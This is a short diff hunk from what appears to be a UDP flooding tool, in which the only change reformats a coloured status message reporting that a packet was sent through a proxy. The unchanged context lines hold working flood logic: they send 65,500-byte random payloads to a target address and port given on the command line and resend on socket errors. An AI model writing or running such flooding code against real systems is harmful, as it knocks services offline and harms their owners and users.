@@ -64,7 +64,7 @@ def main():
             else:
                 port = int(sys.argv[2])
             sock.sendto(random._urandom(65500),(str(sys.argv[1]),int(port)))
-            print(' \033[92m',randoms,"| \033[97m[\033[92m!\033[97m] \033[97mPacket Sended By\033[96m", str(proxy.rstrip("\n\r")))
+            print('\033[97m[\033[92m!\033[97m] \033[93m'+str(randoms),"| \033[97mPacket Sended By\033[96m", str(proxy.rstrip("\n\r")))
         except socket.error:
             sock.sendto(random._urandom(65500),(str(sys.argv[1]),int(port)))
         except socket.timeout:
